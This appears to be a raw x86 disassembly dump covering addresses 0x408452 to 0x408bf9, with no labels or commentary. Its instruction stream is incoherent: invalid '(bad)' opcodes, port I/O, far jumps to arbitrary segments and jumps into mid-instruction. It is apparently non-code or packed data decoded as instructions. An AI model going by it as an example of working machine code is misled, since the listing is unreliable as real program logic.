  408452:	dec    esi
  408453:	pop    ds
  408454:	xchg   ebp,eax
  408455:	js     0x40849d
  408457:	imul   edi,DWORD PTR [ebx-0x432e8ab6],0x4f
  40845e:	js     0x4083e9
  408460:	lea    eax,[ebx]
  408462:	mov    ebx,0x165c3f09
  408467:	sbb    eax,0x96f96819
  40846c:	dec    ebx
  40846d:	and    edi,0xaddc0ee7
  408473:	jecxz  0x408402
  408475:	fdivp  st(5),st
  408477:	lahf   
  408478:	ds int 0x9
  40847b:	mov    al,ds:0x20a99d5c
  408480:	ror    DWORD PTR [eax+eax*8-0x59df82a2],1
  408487:	adc    dl,dh
  408489:	sbb    BYTE PTR [edx-0x64442508],0xdc
  408490:	jmp    0x198b:0xebd5fe34
  408497:	loopne 0x4084cb
  408499:	sub    al,0xa6
  40849b:	in     eax,0x78
  40849d:	xchg   esi,eax
  40849e:	jecxz  0x4084f3
  4084a0:	fst    DWORD PTR [ebp+0x133de82c]
  4084a6:	pop    esi
  4084a7:	or     dh,dl
  4084a9:	stos   BYTE PTR es:[edi],al
  4084aa:	mov    al,0xcf
  4084ac:	jecxz  0x408463
  4084ae:	ins    DWORD PTR es:[edi],dx
  4084af:	or     bl,BYTE PTR [edi]
  4084b1:	les    edx,FWORD PTR [ebx]
  4084b3:	jg     0x40849f
  4084b5:	lea    ecx,[esi-0x3d]
  4084b8:	mov    esi,0x3e3a6b8f
  4084bd:	int3   
  4084be:	and    cl,BYTE PTR [ecx+0x21]
  4084c1:	mov    edi,DWORD PTR [ebx]
  4084c3:	sbb    al,0x1a
  4084c5:	test   DWORD PTR [ecx+ebx*2],0xdb0f5652
  4084cc:	jae    0x4084be
  4084ce:	sbb    ah,dh
  4084d0:	sub    DWORD PTR [esi-0x4f22afaf],edi
  4084d6:	push   es
  4084d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084d8:	adc    ebp,DWORD PTR [ebp+0x59]
  4084db:	push   esi
  4084dc:	mov    bl,0xca
  4084de:	adc    DWORD PTR [ebx+0x348fae0b],0xffffffb8
  4084e5:	aaa    
  4084e6:	sbb    bl,0x48
  4084e9:	ins    DWORD PTR es:[edi],dx
  4084ea:	in     al,dx
  4084eb:	rcl    ebx,1
  4084ed:	add    ax,0xfdb2
  4084f1:	lea    esp,[edx+ebx*4]
  4084f4:	jnp    0x4084e8
  4084f6:	inc    esp
  4084f7:	mov    ebp,0x3615deaf
  4084fc:	cwde   
  4084fd:	jl     0x40847f
  4084ff:	ffreep st(5)
  408501:	and    ah,BYTE PTR [edx-0x59c14a9e]
  408507:	seto   BYTE PTR [ecx]
  40850a:	add    al,BYTE PTR [edi+ecx*4]
  40850d:	call   0x5bf5a468
  408512:	shr    BYTE PTR [ecx+0x27ae4900],cl
  408518:	jp     0x4084dd
  40851a:	add    al,0x52
  40851c:	sub    edi,DWORD PTR [edi-0x35]
  40851f:	adc    DWORD PTR [ecx],esi
  408521:	cmp    BYTE PTR [ebx],al
  408523:	repz gs inc ebx
  408526:	out    0x7d,eax
  408528:	inc    esp
  408529:	repnz out 0xba,eax
  40852c:	xchg   DWORD PTR [edx-0x6e],esi
  40852f:	retf   
  408530:	(bad)  
  408531:	in     eax,dx
  408532:	push   edx
  408533:	jp     0x40854d
  408535:	mov    WORD PTR [esi-0x77c515b8],ds
  40853b:	pop    eax
  40853c:	push   esp
  40853d:	and    dl,BYTE PTR [eax+0x38]
  408540:	sbb    ah,ah
  408542:	lds    edi,FWORD PTR [ecx-0x296fde19]
  408548:	mov    WORD PTR [edi-0x5c],ss
  40854b:	adc    BYTE PTR [ecx],bl
  40854d:	xor    al,0x7d
  40854f:	shl    DWORD PTR [edx+0x20],1
  408552:	loopne 0x40859a
  408554:	push   edx
  408555:	push   0xffffff89
  408557:	xchg   DWORD PTR [eax+0x41],ebp
  40855a:	fdivr  DWORD PTR [ebx]
  40855c:	fs add al,0x9e
  40855f:	jp     0x408577
  408561:	ret    0x2dc8
  408564:	mov    bl,0x69
  408566:	repnz mov bh,0xae
  408569:	mov    al,0xfa
  40856b:	pop    esi
  40856c:	pop    edi
  40856d:	and    ebx,DWORD PTR [ebx]
  40856f:	cmc    
  408570:	lahf   
  408571:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408573:	cs xchg ebx,eax
  408575:	das    
  408576:	mov    ecx,0xcd2d38b9
  40857b:	or     eax,0x210462e3
  408580:	or     bh,BYTE PTR [edx]
  408582:	inc    edi
  408583:	stos   DWORD PTR es:[edi],eax
  408584:	fwait
  408585:	ret    0x15f8
  408588:	xchg   ebp,eax
  408589:	xor    BYTE PTR [ecx+0x74d4d4fb],0xdb
  408590:	push   edi
  408591:	dec    edi
  408592:	mov    ch,0xad
  408594:	xor    DWORD PTR [esi-0x70],ebx
  408597:	daa    
  408598:	in     eax,dx
  408599:	retf   
  40859a:	rcl    DWORD PTR [ebx],1
  40859c:	mov    eax,ds:0xcf4a7f32
  4085a1:	pop    eax
  4085a2:	mov    bl,BYTE PTR [eax+eax*8+0x37134c11]
  4085a9:	not    DWORD PTR [ebx-0x2e]
  4085ac:	adc    eax,0x312e457c
  4085b1:	popf   
  4085b2:	stc    
  4085b3:	rcl    BYTE PTR [edx+ebx*2],cl
  4085b6:	sub    al,0x24
  4085b8:	fwait
  4085b9:	popf   
  4085ba:	sahf   
  4085bb:	jbe    0x4085ec
  4085bd:	aaa    
  4085be:	cmp    eax,DWORD PTR [edi+0x2e89f525]
  4085c4:	push   esp
  4085c5:	xchg   ebx,eax
  4085c6:	inc    dx
  4085c8:	test   DWORD PTR [edx],ebp
  4085ca:	xor    BYTE PTR [esp+eax*1+0x2d],0x1
  4085cf:	dec    ebx
  4085d0:	jmp    0x5ffc:0x8106f992
  4085d7:	std    
  4085d8:	iret   
  4085d9:	mov    BYTE PTR [eax],dl
  4085db:	sbb    ch,dh
  4085dd:	push   ss
  4085de:	xchg   BYTE PTR [ecx],dl
  4085e0:	adc    ah,0xd3
  4085e3:	xchg   ecx,eax
  4085e4:	arpl   cx,bp
  4085e6:	in     al,dx
  4085e7:	mov    eax,ds:0x3684b188
  4085ec:	std    
  4085ed:	mov    bl,0x56
  4085ef:	les    ecx,FWORD PTR ds:0x1183d344
  4085f5:	pop    ds
  4085f6:	outs   dx,DWORD PTR ds:[esi]
  4085f7:	or     ch,bh
  4085f9:	inc    ecx
  4085fa:	xchg   ebx,eax
  4085fb:	repz xor dh,0x3e
  4085ff:	(bad)  
  408600:	in     eax,0x88
  408602:	mov    al,0xdd
  408604:	in     eax,0xe3
  408606:	inc    ebx
  408607:	adc    eax,0xfd8dad3b
  40860c:	jno    0x40865c
  40860e:	or     bl,BYTE PTR [edi+0x6c4e56d8]
  408614:	call   0xe070b82c
  408619:	cmp    esi,DWORD PTR [edi-0x37]
  40861c:	mov    gs,WORD PTR [ecx+ebp*1]
  40861f:	dec    ebx
  408620:	cmp    BYTE PTR ds:0x8323f7ea,cl
  408626:	scas   al,BYTE PTR es:[edi]
  408627:	ficomp WORD PTR [ebx+ecx*1+0x5fc4abc3]
  40862e:	cld    
  40862f:	or     eax,esp
  408631:	adc    eax,0x9c803438
  408636:	mov    al,ds:0xab74a4a9
  40863b:	lds    edi,FWORD PTR [ecx+edi*4+0x5f81c66b]
  408642:	inc    esi
  408643:	sbb    esi,ecx
  408645:	xchg   ebp,eax
  408646:	jae    0x408671
  408648:	test   al,0x25
  40864a:	pop    esp
  40864b:	ud2    
  40864d:	push   esi
  40864e:	sbb    BYTE PTR [ebp+0x23],0x86
  408652:	adc    esp,0xf3f35cde
  408658:	mov    dl,0xd3
  40865a:	xor    al,0xc2
  40865c:	jle    0x40866a
  40865e:	dec    ecx
  40865f:	xchg   edi,eax
  408660:	dec    edi
  408661:	pop    ebx
  408662:	mov    dl,0x98
  408664:	ja     0x4086e3
  408666:	push   0x2b52d5db
  40866b:	out    dx,eax
  40866c:	cmc    
  40866d:	das    
  40866e:	fisttp WORD PTR [ebx-0x11]
  408671:	or     BYTE PTR [ebx+0x4e1f2e89],bl
  408677:	cmp    DWORD PTR [esi+0x4c9c6857],edx
  40867d:	out    0xbe,eax
  40867f:	in     eax,0x75
  408681:	jno    0x40867e
  408683:	adc    BYTE PTR [ecx+0x79],ah
  408686:	test   eax,0xbf9bf4ad
  40868b:	mov    dh,0xb7
  40868d:	pop    esi
  40868e:	loopne 0x4086d7
  408690:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408691:	pop    ecx
  408692:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408693:	add    ch,BYTE PTR [eax-0x53]
  408696:	aaa    
  408697:	push   ds
  408698:	add    ecx,DWORD PTR [edi]
  40869a:	xchg   ah,dh
  40869c:	ins    DWORD PTR es:[edi],dx
  40869d:	nop
  40869e:	aam    0x2b
  4086a0:	and    dh,BYTE PTR fs:[edx]
  4086a3:	fbld   TBYTE PTR [esi+eiz*4+0xf716f24]
  4086aa:	fstp   DWORD PTR [edi]
  4086ac:	sub    edi,DWORD PTR [edi+ebp*2-0x34]
  4086b0:	sahf   
  4086b1:	test   eax,0x43bc99b6
  4086b6:	sbb    eax,0xa2ff01f6
  4086bb:	popa   
  4086bc:	pop    es
  4086bd:	enter  0x25cf,0xd9
  4086c1:	retf   
  4086c2:	lea    eax,[edx]
  4086c4:	xchg   edx,eax
  4086c5:	rcr    BYTE PTR [edx-0x64],cl
  4086c8:	ret    
  4086c9:	and    edi,DWORD PTR [ecx-0x145cb25f]
  4086cf:	mov    cl,0xc
  4086d1:	mov    eax,ds:0xd55a5adf
  4086d6:	test   al,0x5b
  4086d8:	and    esp,edx
  4086da:	mov    edx,0xd52443be
  4086df:	xchg   ebx,eax
  4086e0:	adc    ah,BYTE PTR [eax-0x1f]
  4086e3:	cld    
  4086e4:	mov    WORD PTR [esp+edx*8-0x45354e83],fs
  4086eb:	jle    0x408769
  4086ed:	fmul   QWORD PTR [edi]
  4086ef:	shl    BYTE PTR [eax-0x4c73bd24],1
  4086f5:	inc    edi
  4086f6:	ret    
  4086f7:	mov    ecx,0x846350b9
  4086fc:	add    BYTE PTR ds:0x355187,ah
  408702:	(bad)  
  408703:	je     0x408760
  408705:	fsub   DWORD PTR [ecx-0x5ffd4a88]
  40870b:	mov    DWORD PTR [ebx-0x17d17921],ebx
  408711:	inc    edx
  408712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408713:	xlat   BYTE PTR gs:[ebx]
  408715:	dec    edx
  408716:	cmp    BYTE PTR [ecx+ebx*2],ah
  408719:	cmc    
  40871a:	into   
  40871b:	and    al,BYTE PTR [ebx]
  40871d:	iret   
  40871e:	mov    esi,esi
  408720:	mov    eax,cs
  408722:	push   0xf8a34ac9
  408727:	ja     0x40879e
  408729:	cmp    cl,BYTE PTR [esi]
  40872b:	jb     0x40877f
  40872d:	ins    DWORD PTR es:[edi],dx
  40872e:	dec    eax
  40872f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408730:	pushf  
  408731:	mov    al,0xce
  408733:	ds clc 
  408735:	mov    edi,0xb91e1c60
  40873a:	mov    dh,0xd4
  40873c:	dec    esp
  40873d:	scas   eax,DWORD PTR es:[edi]
  40873e:	in     al,0xf2
  408740:	gs inc esi
  408742:	adc    DWORD PTR [eax+0x47],eax
  408745:	call   0x961f9e2d
  40874a:	repz dec ebx
  40874c:	mov    ah,BYTE PTR [ebp+0x7]
  40874f:	jge    0x408705
  408751:	je     0x40877e
  408753:	inc    ebp
  408754:	xchg   edx,eax
  408755:	xchg   ebp,eax
  408756:	and    DWORD PTR [eax+0x79011f89],ebx
  40875c:	add    BYTE PTR [edi],bh
  40875e:	and    ecx,DWORD PTR [ecx]
  408760:	mov    ch,BYTE PTR [edx+ecx*8]
  408763:	lea    ebp,[edi]
  408765:	lods   eax,DWORD PTR ds:[esi]
  408767:	or     eax,esi
  408769:	sub    al,0xd
  40876b:	cwde   
  40876c:	fcomp  QWORD PTR [edx]
  40876e:	pop    ecx
  40876f:	loop   0x408747
  408771:	inc    esi
  408772:	popf   
  408773:	jecxz  0x408766
  408775:	fcomi  st,st(4)
  408777:	adc    eax,0xa4ad84c0
  40877c:	jle    0x4087ad
  40877e:	cmc    
  40877f:	cmp    BYTE PTR [ebp-0x6c2b2b4a],dh
  408785:	stos   DWORD PTR es:[edi],eax
  408786:	stos   BYTE PTR es:[edi],al
  408787:	jl     0x408770
  408789:	adc    bl,BYTE PTR [ecx+0x32]
  40878c:	or     ch,0xe0
  40878f:	and    eax,0x9611d36a
  408794:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408795:	xchg   ebp,eax
  408796:	add    eax,0x26f901e7
  40879b:	ret    0xc088
  40879e:	cmp    ch,bl
  4087a0:	aam    0xa4
  4087a2:	mov    dh,0xf0
  4087a4:	jns    0x408747
  4087a6:	inc    eax
  4087a7:	ret    
  4087a8:	jns    0x40872d
  4087aa:	dec    eax
  4087ab:	inc    eax
  4087ac:	cwde   
  4087ad:	mov    dl,0xfd
  4087af:	push   esp
  4087b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087b1:	inc    eax
  4087b2:	pop    ds
  4087b3:	gs sub ch,al
  4087b6:	shr    DWORD PTR [ecx-0x67719bb5],1
  4087bc:	iret   
  4087bd:	xor    ebx,DWORD PTR [edx]
  4087bf:	(bad)  
  4087c1:	cmp    ebp,edx
  4087c3:	bound  edx,QWORD PTR [ebx+0x73]
  4087c6:	jmp    0x571e:0x908abad
  4087cd:	jg     0x4087fe
  4087cf:	pop    ds
  4087d0:	sbb    eax,0x4032d8b2
  4087d5:	mov    esp,0xa96d2453
  4087da:	push   ebx
  4087db:	xchg   esp,eax
  4087dc:	fmulp  st(4),st
  4087de:	sub    eax,0x16318703
  4087e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087e4:	push   esi
  4087e5:	cmp    eax,0x31ba3939
  4087ea:	mov    edx,0xa3fbd4e8
  4087ef:	fisttp DWORD PTR [ecx-0x1e50512b]
  4087f5:	cmp    al,0x90
  4087f7:	sbb    DWORD PTR [ecx+0x68f54232],edi
  4087fd:	sub    eax,0x2d788a4d
  408802:	outs   dx,DWORD PTR ds:[esi]
  408803:	cmp    BYTE PTR [eiz*1-0x58f9e862],ah
  40880a:	mov    bl,BYTE PTR [edx]
  40880c:	aaa    
  40880d:	rcl    edi,cl
  40880f:	mov    ch,BYTE PTR [ebx]
  408811:	mov    ss,WORD PTR [ebp-0x7934c208]
  408817:	cwde   
  408818:	lods   al,BYTE PTR ds:[esi]
  408819:	sbb    DWORD PTR [ebx-0x55],esp
  40881c:	cld    
  40881d:	cwde   
  40881e:	mov    cl,0x34
  408820:	cmp    ah,BYTE PTR [esi]
  408822:	xor    ah,BYTE PTR [edx+0x2]
  408825:	cwde   
  408826:	mov    WORD PTR [esi],ss
  408828:	dec    ebp
  408829:	or     dl,BYTE PTR [edi]
  40882b:	retf   
  40882c:	jo     0x40885c
  40882e:	sti    
  40882f:	scas   al,BYTE PTR es:[edi]
  408830:	xchg   ebx,eax
  408831:	xchg   ecx,eax
  408832:	out    dx,eax
  408833:	stos   BYTE PTR es:[edi],al
  408834:	add    BYTE PTR [ecx+0x37],ch
  408837:	cmp    cl,BYTE PTR [ebp-0x2b]
  40883a:	ins    BYTE PTR es:[edi],dx
  40883b:	fs dec ebp
  40883d:	pop    eax
  40883e:	pusha  
  40883f:	fadd   DWORD PTR [ebx-0x62e4b839]
  408845:	push   ecx
  408846:	jo     0x40881f
  408848:	mov    dh,0xaf
  40884a:	in     eax,0x40
  40884c:	add    edi,DWORD PTR ds:0xbc593e6b
  408852:	scas   eax,DWORD PTR es:[edi]
  408853:	or     al,0xa9
  408855:	xchg   ebx,eax
  408856:	sub    esp,DWORD PTR [ebx]
  408858:	jmp    0x643c:0xa7eaf75b
  40885f:	call   0x29658579
  408864:	retf   
  408865:	in     eax,0xeb
  408867:	add    dl,BYTE PTR [ebx-0x52]
  40886a:	fild   DWORD PTR [edx-0x7bdc878b]
  408870:	icebp  
  408871:	clc    
  408872:	xor    eax,0x6f997207
  408877:	adc    al,BYTE PTR [ebp+0x518fb00d]
  40887d:	and    al,0xe2
  40887f:	ror    BYTE PTR [ecx],0xee
  408882:	inc    eax
  408883:	aam    0xb7
  408885:	shl    DWORD PTR [edx-0x45d9057b],0x72
  40888c:	sub    eax,0xd88bb67e
  408891:	mov    eax,ds:0x3a698f34
  408896:	imul   esp,DWORD PTR [ecx-0x71],0xd
  40889a:	adc    edi,0x66
  40889d:	sbb    esp,edx
  40889f:	add    al,0x98
  4088a1:	repnz push cs
  4088a3:	(bad)  
  4088a5:	pop    ebp
  4088a6:	inc    ecx
  4088a7:	mov    cl,0x30
  4088a9:	fwait
  4088aa:	lods   al,BYTE PTR ds:[esi]
  4088ab:	jmp    0xbc288ef9
  4088b0:	xchg   edx,eax
  4088b1:	and    eax,0xf98c1356
  4088b6:	mov    al,ds:0x6bd1d8e8
  4088bb:	and    BYTE PTR [esi+ebp*2+0x50b5f927],0xd7
  4088c3:	push   eax
  4088c4:	sti    
  4088c5:	(bad)  
  4088c6:	shufps xmm6,XMMWORD PTR [edx+edx*1-0x1eb71b15],0x6d
  4088cf:	pusha  
  4088d0:	iret   
  4088d1:	ffreep st(0)
  4088d3:	adc    dl,BYTE PTR [edx-0x314a6022]
  4088d9:	mov    cs,ebp
  4088db:	xchg   esi,eax
  4088dc:	pop    eax
  4088dd:	stos   DWORD PTR es:[edi],eax
  4088de:	ja     0x40887d
  4088e0:	pop    es
  4088e1:	pop    ebx
  4088e2:	pop    ebx
  4088e3:	scas   eax,DWORD PTR es:[edi]
  4088e4:	jle    0x4088c1
  4088e6:	inc    eax
  4088e7:	add    esp,0xffffffd9
  4088ea:	pop    ss
  4088eb:	xor    BYTE PTR [edi+edi*4-0x8],ah
  4088ef:	add    eax,0x9d59069f
  4088f4:	mov    ecx,0x74b01000
  4088f9:	call   0xdf22:0x80240644
  408900:	scas   al,BYTE PTR es:[edi]
  408901:	out    dx,eax
  408902:	inc    ebp
  408903:	sub    al,0xe0
  408905:	repnz push ebx
  408907:	xor    al,0xa6
  408909:	mov    bl,0xab
  40890b:	inc    edi
  40890c:	xchg   esi,eax
  40890d:	test   eax,0x30dd10b5
  408912:	xor    eax,0xe1872eda
  408917:	aad    0xf5
  408919:	dec    eax
  40891a:	xchg   esi,eax
  40891b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40891c:	(bad)  
  40891e:	test   esi,edx
  408920:	cmp    esp,DWORD PTR [edi+0x7dda180a]
  408926:	mov    esi,0x5766c4b1
  40892b:	mov    ch,0xf8
  40892d:	into   
  40892e:	rcr    edx,cl
  408930:	inc    ecx
  408931:	sbb    eax,0x90d07ece
  408936:	push   es
  408937:	pushf  
  408938:	xor    dh,BYTE PTR [esi+eax*8]
  40893b:	mov    ds,WORD PTR [ecx+0x7a]
  40893e:	in     eax,dx
  40893f:	in     eax,0x90
  408941:	sbb    ch,0x7b
  408944:	pop    ebp
  408945:	sub    BYTE PTR ds:0x38ba3559,bh
  40894b:	int    0xba
  40894d:	iret   
  40894e:	fs dec esp
  408950:	adc    DWORD PTR [edi+0x30],esp
  408953:	lds    ebx,FWORD PTR [edx+0x5cb5ad37]
  408959:	ror    DWORD PTR [edx-0x6e9d527f],0xfa
  408960:	fcomp  DWORD PTR [edx+0x2ec6621b]
  408966:	add    al,0xac
  408968:	cmp    BYTE PTR [esi+eiz*2+0x7a],dl
  40896c:	lods   eax,DWORD PTR ds:[esi]
  40896d:	and    cl,bl
  40896f:	mov    eax,0x43d8464d
  408974:	inc    BYTE PTR [ecx+0x78]
  408977:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408978:	les    ebp,FWORD PTR [eax]
  40897a:	push   ecx
  40897b:	rcr    DWORD PTR [edi+0x115d4183],1
  408981:	cmc    
  408982:	pop    esp
  408983:	inc    ebx
  408984:	shl    BYTE PTR [eax+0x3e],cl
  408987:	mov    ds,ebp
  408989:	or     eax,0xa40d6d40
  40898e:	outs   dx,DWORD PTR ds:[esi]
  40898f:	pop    ebp
  408990:	ss leave 
  408992:	xor    ch,BYTE PTR [esi+0x28bbc98]
  408998:	inc    BYTE PTR ss:[ecx-0x60e99eba]
  40899f:	and    edi,0xfffffff5
  4089a2:	mov    edx,0xde1d50e
  4089a7:	or     eax,0x7888da69
  4089ac:	jb     0x408990
  4089ae:	or     edx,eax
  4089b0:	mov    al,0x90
  4089b2:	jno    0x4089d2
  4089b4:	(bad)  
  4089b5:	xor    al,0x29
  4089b7:	test   DWORD PTR [ecx],esi
  4089b9:	xlat   BYTE PTR ds:[ebx]
  4089ba:	sahf   
  4089bb:	add    BYTE PTR [ebx],bl
  4089bd:	addr16 jns 0x408961
  4089c0:	xchg   esi,eax
  4089c1:	jmp    0x19bf:0x606ad937
  4089c8:	lock fild QWORD PTR [ebp-0x7c]
  4089cc:	outs   dx,DWORD PTR ds:[esi]
  4089cd:	repz cmp DWORD PTR [ebp+0x5b],edx
  4089d1:	cli    
  4089d2:	out    dx,al
  4089d3:	jp     0x408a2a
  4089d5:	dec    esi
  4089d6:	cli    
  4089d7:	pop    ds
  4089d8:	daa    
  4089d9:	push   es
  4089da:	call   FWORD PTR [edi-0x69]
  4089dd:	sbb    eax,0xbae149b1
  4089e2:	(bad)  
  4089e3:	leave  
  4089e4:	jle    0x408a5f
  4089e6:	cmp    ch,ah
  4089e8:	retf   0x6347
  4089eb:	int    0x7d
  4089ed:	clc    
  4089ee:	sub    ebp,DWORD PTR [edx+ecx*1+0x1cfbbc9]
  4089f5:	mov    dl,0x8
  4089f7:	imul   ebx,DWORD PTR [ecx+0x8],0xffffffac
  4089fb:	jbe    0x4089ce
  4089fd:	xchg   edi,eax
  4089fe:	or     al,0x55
  408a00:	popa   
  408a01:	pop    edi
  408a02:	cmp    edi,DWORD PTR [edi+0x2a]
  408a05:	data16 cmp BYTE PTR [ebx-0x19],dh
  408a09:	in     al,0x5b
  408a0b:	push   ebp
  408a0c:	loop   0x408a08
  408a0e:	in     eax,dx
  408a0f:	pop    ds
  408a10:	xlat   BYTE PTR ds:[ebx]
  408a11:	mov    DWORD PTR [eax+0x32],ecx
  408a14:	rcr    DWORD PTR [ecx+0x56],1
  408a17:	imul   edx,ebp,0x37
  408a1a:	push   eax
  408a1b:	fimul  DWORD PTR ds:0x46dfb967
  408a21:	pop    ss
  408a22:	sbb    esp,DWORD PTR [eax+0x2f]
  408a25:	push   eax
  408a26:	mov    ah,0x61
  408a28:	xchg   edi,eax
  408a29:	scas   al,BYTE PTR es:[edi]
  408a2a:	cwde   
  408a2b:	loope  0x4089d4
  408a2d:	mov    bl,0x23
  408a2f:	scas   eax,DWORD PTR es:[edi]
  408a30:	mov    cl,0xc
  408a32:	jbe    0x408a01
  408a34:	pop    ebx
  408a35:	pop    ebx
  408a36:	pop    esp
  408a37:	mov    bh,0xf
  408a39:	cmp    ah,BYTE PTR [eax-0xe406f5c]
  408a3f:	push   edx
  408a40:	adc    DWORD PTR [esi+esi*2],ebp
  408a43:	icebp  
  408a44:	push   eax
  408a45:	sar    al,cl
  408a47:	sub    BYTE PTR [ebp*1+0x75898ebf],cl
  408a4e:	xlat   BYTE PTR ds:[ebx]
  408a4f:	or     eax,0x32093cdf
  408a54:	cmp    BYTE PTR [edi],bl
  408a56:	xchg   ebx,eax
  408a57:	iret   
  408a58:	or     BYTE PTR [ebp+eax*4-0x25],0xea
  408a5d:	fld    DWORD PTR [eax-0x286881a9]
  408a63:	test   bh,ch
  408a65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a66:	sub    ecx,DWORD PTR [ecx+0xa984bc4]
  408a6c:	frstor [ebx]
  408a6e:	mov    esi,0x9f340e6e
  408a73:	fist   WORD PTR [ebx-0x22a10148]
  408a79:	out    0xaf,eax
  408a7b:	pop    ds
  408a7c:	les    ebx,FWORD PTR [ecx+0x33f15873]
  408a82:	aam    0xa2
  408a84:	(bad)  
  408a85:	xchg   edi,eax
  408a86:	pusha  
  408a87:	fcom   DWORD PTR [eax]
  408a89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a8a:	adc    esi,ebx
  408a8c:	lds    edi,FWORD PTR [ebp+0x6f]
  408a8f:	mov    cl,0xcb
  408a91:	sti    
  408a92:	push   es
  408a93:	sub    eax,0xe526d116
  408a98:	sahf   
  408a99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a9a:	nop
  408a9b:	xchg   ecx,eax
  408a9c:	repnz retf 
  408a9e:	xlat   BYTE PTR ds:[ebx]
  408a9f:	fistp  DWORD PTR [edx+0x49]
  408aa2:	jmp    0x95ea5a9
  408aa7:	push   ds
  408aa8:	adc    dl,BYTE PTR ds:0xac0933e6
  408aae:	fistp  DWORD PTR [ecx+0xb]
  408ab1:	xchg   edi,eax
  408ab2:	mov    WORD PTR [esi-0x1a],es
  408ab5:	and    eax,0x1d326714
  408aba:	stos   DWORD PTR es:[edi],eax
  408abb:	jmp    0xf124:0x105140ef
  408ac2:	mov    ecx,edi
  408ac4:	xchg   esp,eax
  408ac5:	or     ecx,esp
  408ac7:	dec    esp
  408ac8:	outs   dx,BYTE PTR ds:[esi]
  408ac9:	sbb    eax,0x2388e7da
  408ace:	cmp    eax,0x473de06e
  408ad3:	popf   
  408ad4:	icebp  
  408ad5:	push   edi
  408ad6:	fwait
  408ad7:	clc    
  408ad8:	jnp    0x408ab9
  408ada:	mov    eax,ds:0x30185b75
  408adf:	dec    ecx
  408ae0:	(bad)  
  408ae1:	lock popa 
  408ae3:	cmp    BYTE PTR [eax],cl
  408ae5:	mov    dh,0x6c
  408ae7:	icebp  
  408ae8:	or     eax,0x4e09cd37
  408aed:	pusha  
  408aee:	cld    
  408aef:	inc    edi
  408af0:	or     eax,0x8a8f613a
  408af5:	mov    ebx,0x1a84d56d
  408afa:	test   al,0x37
  408afc:	imul   edx,DWORD PTR [edx],0xffffffc6
  408aff:	mov    ch,al
  408b01:	sbb    eax,0xb471a92
  408b06:	mov    al,BYTE PTR [eax]
  408b08:	xor    BYTE PTR [edx],bl
  408b0a:	in     eax,0xb6
  408b0c:	and    DWORD PTR [eax+0xf636438],eax
  408b12:	inc    esp
  408b13:	enter  0x31e3,0xc8
  408b17:	out    0x86,eax
  408b19:	(bad)  
  408b1a:	push   0x55
  408b1c:	jb     0x408ac7
  408b1e:	fwait
  408b1f:	sub    DWORD PTR [ebx-0x5d80710b],ecx
  408b25:	sbb    al,dl
  408b27:	inc    ecx
  408b28:	xor    DWORD PTR [esi+0x65],esp
  408b2b:	mov    eax,ds:0xa5647f71
  408b30:	pop    esp
  408b31:	jmp    0x713188f2
  408b36:	jmp    0x3908:0xc0e5ca8e
  408b3d:	popa   
  408b3e:	fcmovu st,st(5)
  408b40:	adc    eax,0x7eb4bf84
  408b45:	aas    
  408b46:	push   eax
  408b47:	jmp    0x8bd695d1
  408b4c:	xchg   ebp,eax
  408b4d:	fisttp DWORD PTR [ebp*4-0x2104ee7c]
  408b54:	dec    edi
  408b55:	out    dx,al
  408b56:	aas    
  408b57:	leave  
  408b58:	push   ebp
  408b59:	repnz or bh,BYTE PTR [edi+0x6b349566]
  408b60:	(bad)  
  408b61:	xchg   ebx,eax
  408b62:	js     0x408b86
  408b64:	jb     0x408b47
  408b66:	popa   
  408b67:	or     ebx,DWORD PTR [edi]
  408b69:	cs cmp al,0x52
  408b6c:	inc    esi
  408b6d:	adc    BYTE PTR [esi],dl
  408b6f:	xor    al,0xfe
  408b71:	fadd   DWORD PTR [esi-0x5f]
  408b74:	push   0x74
  408b76:	je     0x408b06
  408b78:	sbb    eax,0x265d5b2d
  408b7d:	arpl   ax,si
  408b7f:	aam    0x9f
  408b81:	add    BYTE PTR [ecx-0x26],0x86
  408b85:	mov    bl,0x34
  408b87:	inc    edx
  408b88:	icebp  
  408b89:	ins    DWORD PTR es:[edi],dx
  408b8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b8b:	ins    DWORD PTR es:[edi],dx
  408b8c:	ret    
  408b8d:	(bad)
  408b91:	out    dx,al
  408b92:	inc    eax
  408b93:	fidivr WORD PTR [edi]
  408b95:	sbb    cl,BYTE PTR [ecx+ebx*4-0x34]
  408b99:	jae    0x408b7a
  408b9b:	add    cl,BYTE PTR [edi-0x14]
  408b9e:	mov    ebp,0x2419e76c
  408ba3:	fisubr DWORD PTR [edi]
  408ba5:	div    DWORD PTR [ebx+edi*4]
  408ba8:	mov    ebp,0xddc74385
  408bad:	pop    esp
  408bae:	pushf  
  408baf:	jle    0x408b39
  408bb1:	fsub   QWORD PTR [edx-0xd1b6cc1]
  408bb7:	stc    
  408bb8:	sub    edi,ecx
  408bba:	push   cs
  408bbb:	int3   
  408bbc:	mov    WORD PTR [eax-0x33],fs
  408bbf:	and    al,0x83
  408bc1:	xor    DWORD PTR [ecx],0x6a963af6
  408bc7:	in     eax,0x8b
  408bc9:	cmp    eax,0x45f0b2d3
  408bce:	sbb    eax,0xea900b61
  408bd3:	imul   eax,DWORD PTR [ebp-0x1f],0xfffffffd
  408bd7:	inc    esp
  408bd8:	(bad)  
  408bd9:	pop    esi
  408bda:	push   ebx
  408bdb:	pop    edi
  408bdc:	mov    ds,WORD PTR [edi]
  408bde:	ret    0x8213
  408be1:	jno    0x408ba0
  408be3:	shl    DWORD PTR ds:0x6f33e729,1
  408be9:	mov    edi,0xfc54aceb
  408bee:	or     DWORD PTR [ebx+0x3069701b],eax
  408bf4:	lahf   
  408bf5:	cmp    al,0x8
  408bf7:	jle    0x408bd3
  408bf9:	push   0x1b
